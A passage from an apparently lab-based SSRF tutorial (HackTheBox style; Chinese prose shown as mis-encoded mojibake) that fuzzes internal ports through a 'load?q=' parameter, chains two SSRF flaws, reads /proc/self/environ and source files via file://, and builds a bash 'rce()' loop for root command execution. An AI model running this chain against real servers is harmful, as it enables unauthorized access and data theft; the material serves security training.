class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></tbody></table></figure>

<p>è¯·è®°ä½ï¼Œè·å–è¿œç¨‹HTMLæ–‡ä»¶å¯èƒ½ä¼šå¯¼è‡´åå°„XSSã€‚</p>
<p>è¯·è®°ä½ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šåªæœ‰ä¸¤ä¸ªå¼€æ”¾ç«¯å£ã€‚ä½†æ˜¯ï¼Œå†…éƒ¨åº”ç”¨ç¨‹åºå¯èƒ½åªå­˜åœ¨äºæœ¬åœ°ä¸»æœºä¸Šå¹¶è¿›è¡Œä¾¦å¬ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ffufè¿™æ ·çš„å·¥å…·æ¥æšä¸¾è¿™äº›Webåº”ç”¨ç¨‹åºï¼Œæ–¹æ³•æ˜¯æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ol>
<li>ç”ŸæˆåŒ…å«æ‰€æœ‰å¯èƒ½ç«¯å£çš„å•è¯åˆ—è¡¨ã€‚</li>
</ol>
<h4 id="Generate-a-Wordlist"><a href="#Generate-a-Wordlist" class="headerlink" title="Generate a Wordlist"></a>Generate a Wordlist</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ for port in {1..65535};do echo $port &gt;&gt; ports.txt;done</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>å‘éšæœºç«¯å£å‘å‡ºcURLè¯·æ±‚ï¼Œä»¥è·å–å¯¹ä¸å­˜åœ¨çš„æœåŠ¡çš„è¯·æ±‚çš„å“åº”å¤§å°ã€‚</li>
</ol>
<h4 id="Curl-Interacting-with-the-Target-1"><a href="#Curl-Interacting-with-the-Target-1" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 30</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:36:25 GMT</span><br><span class="line"></span><br><span class="line">[Errno 111] Connection refused</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>å¯¹å•è¯åˆ—è¡¨ä½¿ç”¨ffufï¼Œå¹¶ä¸¢å¼ƒå…·æœ‰æˆ‘ä»¬å…ˆå‰ç¡®å®šçš„å¤§å°çš„å“åº”ã€‚</li>
</ol>
<h4 id="Port-Fuzzing"><a href="#Port-Fuzzing" class="headerlink" title="Port Fuzzing"></a>Port Fuzzing</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT" -fs 30</span><br><span class="line"></span><br><span class="line">        /'___\  /'___\           /'___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT</span><br><span class="line"> :: Wordlist         : PORT: ./ports.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line"> :: Filter           : Response size: 30</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">80                      [Status: 200, Size: 153, Words: 11, Lines: 8]</span><br><span class="line">5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]</span><br><span class="line">:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å·²æ”¶åˆ°ç«¯å£<code>5000</code>çš„æœ‰æ•ˆå“åº”ã€‚è®©æˆ‘ä»¬æ£€æŸ¥å¦‚ä¸‹ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target"><a href="#cURL-Interacting-with-the-Target" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:5000"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:47:16 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hey!&lt;/h1&gt;&lt;a&gt;Some internal app!&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¦‚ä½•é€šè¿‡SSRFåˆ°è¾¾å†…éƒ¨åº”ç”¨ç¨‹åºå¹¶ä½¿ç”¨ä¸åŒçš„æ¨¡å¼æ¥åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚æœ‰äº†è¿™äº›çŸ¥è¯†ï¼Œè®©æˆ‘ä»¬å†æ¬¡é€šè¿‡SSRFå°è¯•æ”»å‡»<code>internal.app.local</code> Webåº”ç”¨ç¨‹åºã€‚æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯åœ¨å†…éƒ¨ä¸»æœºä¸Šå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å‘ä¹‹å‰å‘ç°çš„å†…éƒ¨åº”ç”¨ç¨‹åºå‘å‡ºä¸€ä¸ªç®€å•çš„cURLè¯·æ±‚ã€‚è®°ä½æˆ‘ä»¬å‘ç°çš„ä¿¡æ¯ï¼Œä¸¤ä¸ªåº”ç”¨ç¨‹åºä»¥ç›¸åŒçš„æ–¹å¼åŠ è½½èµ„æºï¼ˆé€šè¿‡<code>q</code>å‚æ•°ï¼‰ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-1"><a href="#cURL-Interacting-with-the-Target-1" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 83</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 13:51:15 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Internal Web Application&lt;/h1&gt;</span><br><span class="line">&lt;a&gt;Hello World!&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å‘ç°ä»»ä½•åœ¨localhostä¸­ä¾¦å¬çš„Webåº”ç”¨ç¨‹åºã€‚è®©æˆ‘ä»¬å°è¯•å‘éšæœºç«¯å£å‘å‡ºè¯·æ±‚ï¼Œä»¥ç¡®å®šæ¥è‡ªå°é—­ç«¯å£çš„å“åº”æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-2"><a href="#cURL-Interacting-with-the-Target-2" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 97</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 14:52:32 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http127.0.0.1:1&lt;/h1&gt;&lt;a&gt;unknown url type: http127.0.0.1&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ”¶åˆ°äº†ä¸€æ¡<code>unknown url type</code>é”™è¯¯æ¶ˆæ¯ã€‚Webåº”ç”¨ç¨‹åºä¼¼ä¹æ­£åœ¨ä»æˆ‘ä»¬çš„è¯·æ±‚ä¸­åˆ é™¤<code>://</code>ã€‚è®©æˆ‘ä»¬å°è¯•é€šè¿‡ä¿®æ”¹URLæ¥å…‹æœè¿™ç§æƒ…å†µã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-3"><a href="#cURL-Interacting-with-the-Target-3" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 99</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 14:55:10 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:1&lt;/h1&gt;&lt;a&gt;[Errno 111] Connection refused&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºè¿”å›ä¸€äº›HTMLå‘ˆç°çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬è¯•å›¾è·å–çš„èµ„æºã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨å“åº”çš„å¤§å°ä½œä¸ºè¿‡æ»¤å™¨ï¼Œè¿™ä¸ªå“åº”å°†å½±å“æˆ‘ä»¬çš„å†…éƒ¨æœåŠ¡å‘ç°ï¼Œå› ä¸ºå®ƒä¼šæ ¹æ®ç«¯å£è€Œå˜åŒ–ã€‚å¹¸è¿çš„æ˜¯ï¼Œffufæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤ffufåŠŸèƒ½æ¥ä½¿ç”¨é”™è¯¯å·è¿‡æ»¤å“åº”ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<h4 id="Port-Fuzzing-1"><a href="#Port-Fuzzing-1" class="headerlink" title="Port Fuzzing"></a>Port Fuzzing</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /'___\  /'___\           /'___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT</span><br><span class="line"> :: Wordlist         : PORT: ./ports.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line"> :: Filter           : Regexp: Errno[[:blank:]]111</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">80                      [Status: 200, Size: 153, Words: 5, Lines: 6]</span><br><span class="line">5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]</span><br><span class="line">:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å‘ç°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºæ­£åœ¨ä¾¦å¬ç«¯å£5000ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº”ç”¨ç¨‹åºä¼šä»¥æ–‡ä»¶åˆ—è¡¨è¿›è¡Œå“åº”ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-4"><a href="#cURL-Interacting-with-the-Target-4" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 385</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:30:07 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/&lt;/h1&gt;&lt;a&gt;total 24K</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..</span><br><span class="line">-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html</span><br><span class="line">-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py</span><br><span class="line">-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py</span><br><span class="line">-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>è®©æˆ‘ä»¬å¿«é€Ÿå›é¡¾ä¸€ä¸‹æˆ‘ä»¬æ‰€å–å¾—çš„æˆå°±ï¼š</p>
<ul>
<li>ä»£è¡¨ubuntu-webå‘internal.app.localå‘å‡ºè¯·æ±‚</li>
<li>åˆ°è¾¾ä¸€ä¸ªWebåº”ç”¨ç¨‹åºä¾¦å¬ç«¯å£5000å†…éƒ¨çš„.app.localé“¾æ¥ä¸¤ä¸ªSSRFæ¼æ´</li>
<li>é€šè¿‡å†…éƒ¨åº”ç”¨ç¨‹åºæŠ«éœ²æ–‡ä»¶åˆ—è¡¨</li>
</ul>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ­å¼€ç›‘å¬<code>internal.app.local</code>çš„Webåº”ç”¨ç¨‹åºçš„æºä»£ç ï¼Œçœ‹çœ‹å¦‚ä½•å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>è®©æˆ‘ä»¬å‘å‡ºä¸€ä¸ªè¯·æ±‚æ¥å…¬å¼€<code>/proc/self/environ</code>æ–‡ä»¶ï¼Œå…¶ä¸­å½“å‰è·¯å¾„åº”è¯¥å­˜åœ¨äº<code>PWD</code>ç¯å¢ƒå˜é‡ä¸‹ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-5"><a href="#cURL-Interacting-with-the-Target-5" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 584</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 16:52:20 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///proc/self/environ&lt;/h1&gt;&lt;a&gt;HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“å½“å‰è·¯å¾„æ˜¯<code>/app</code>ï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶åˆ—è¡¨ã€‚è®©æˆ‘ä»¬å…¬å¼€<code>internal_local.py</code>æ–‡ä»¶å¦‚ä¸‹ã€‚</p>
<h4 id="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„-1"><a href="#é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„-1" class="headerlink" title="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„"></a>é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 771</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:40:28 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///app/internal_local.py&lt;/h1&gt;&lt;a&gt;import os</span><br><span class="line">from flask import *</span><br><span class="line">import urllib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def run_command(command):</span><br><span class="line">    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout = p.stdout.read()</span><br><span class="line">    stderr = p.stderr.read()</span><br><span class="line">    result = stdout.decode() + " " + stderr.decode()</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">@app.route("/")</span><br><span class="line">def index():</span><br><span class="line">    return run_command("ls -lha")</span><br><span class="line"></span><br><span class="line">@app.route("/runme")</span><br><span class="line">def runmewithargs():</span><br><span class="line">    command = request.args.get("x")</span><br><span class="line">    if command == "":</span><br><span class="line">        return "Use /runme?x=&lt;CMD&gt;"</span><br><span class="line">    return run_command(command)</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    app.run(host="127.0.0.1", port=5000)</span><br><span class="line">&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>é€šè¿‡ç ”ç©¶ä¸Šé¢çš„æºä»£ç ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå‘<code>/runme?x=&lt;CMD&gt;</code>å‘é€GETè¯·æ±‚ã€‚è®©æˆ‘ä»¬é€šè¿‡å‘é€<code>whoami</code>ä½œä¸ºå‘½ä»¤æ¥ç¡®è®¤è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-6"><a href="#cURL-Interacting-with-the-Target-6" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 93</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:48:32 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=whoami&lt;/h1&gt;&lt;a&gt;root</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šçš„è¶…çº§ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸‹æ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¯•å›¾æäº¤ä¸€ä¸ªå¸¦æœ‰å‚æ•°çš„å‘½ä»¤ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ    </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 586</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"</span><br><span class="line">        "http://www.w3.org/TR/html4/strict.dtd"&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;</span><br><span class="line">        &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>è¦æ‰§è¡Œå¸¦æœ‰å‚æ•°æˆ–ç‰¹æ®Šå­—ç¬¦çš„å‘½ä»¤ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é€šè¿‡ä¸‰ä¸ªä¸åŒçš„Webåº”ç”¨ç¨‹åºæ—¶å¯¹å®ƒä»¬è¿›è¡Œä¸‰æ¬¡ç¼–ç ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»»ä½•åœ¨çº¿URLç¼–ç æœåŠ¡ï¼Œå¦‚<a target="_blank" rel="noopener" href="https://www.urlencoder.org/">urlencoder.org</a>ã€‚ä¹Ÿå­˜åœ¨ä»ç»ˆç«¯å®ç°è¿™ä¸€ç‚¹çš„å¿«é€Ÿæ–¹æ³•ã€‚è¿™æ˜¯ä½¿ç”¨<code>jq</code>ï¼Œå®ƒæ”¯æŒå¦‚ä¸‹ç¼–ç ï¼š</p>
<h4 id="Install-JQ-å®‰è£…JQ"><a href="#Install-JQ-å®‰è£…JQ" class="headerlink" title="Install JQ å®‰è£…JQ"></a>Install JQ å®‰è£…JQ</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt-get install jq</span><br><span class="line">mikannse7@htb[/htb]$ echo "encode me" | jq -sRr @uri</span><br><span class="line">encode%20me%0A</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬ç°åœ¨å¯ä»¥åˆ›å»ºä¸€ä¸ªbashå‡½æ•°æ¥è‡ªåŠ¨æ‰§è¡Œç›®æ ‡åº”ç”¨ç¨‹åºä¸Šçš„å‘½ä»¤ã€‚</p>
<h4 id="Automate-executing-commands"><a href="#Automate-executing-commands" class="headerlink" title="Automate executing commands"></a>Automate executing commands</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ function rce() {</span><br><span class="line">function&gt; while true; do</span><br><span class="line">function while&gt; echo -n "# "; read cmd</span><br><span class="line">function while&gt; ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)</span><br><span class="line">function while&gt; curl -s -o - "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"</span><br><span class="line">function while&gt; echo ""</span><br><span class="line">function while&gt; done</span><br><span class="line">function&gt; }</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨æˆ‘ä»¬éœ€è¦è°ƒç”¨å‡½æ•°å¹¶é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼š        </p>
